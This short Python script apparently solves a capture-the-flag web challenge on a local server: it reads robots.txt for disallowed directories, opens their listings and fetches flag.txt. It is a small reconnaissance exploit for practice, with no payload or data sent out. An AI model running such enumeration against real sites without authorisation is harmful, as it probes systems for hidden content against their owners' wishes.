#!/usr/bin/env python3
# Usage: python3 exp.py [base_url]      (default http://127.0.0.1:8081)
#
# 目录扫描：读 robots.txt 找隐藏目录 -> 进目录 -> 读 flag.txt。
import re
import sys
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8081").rstrip("/")


def http(path):
    return urllib.request.urlopen(BASE + path, timeout=10).read().decode("utf-8", "replace")


robots = http("/robots.txt")
dirs = re.findall(r"Disallow:\s*(\S+)", robots)
print("[*] robots.txt disallow: %s" % ", ".join(dirs))

for d in dirs:
    try:
        listing = http(d.rstrip("/") + "/")
    except Exception:
        continue
    m = re.search(r'href="([^"]*flag\.txt)"', listing)
    if not m:
        continue
    flag_path = m.group(1)
    if not flag_path.startswith("/"):
        flag_path = "/" + flag_path
    flag = http(flag_path).strip()
    print("[+] flag: %s" % flag)
    break
else:
    sys.exit("[-] flag.txt not found via robots.txt - wrong challenge?")
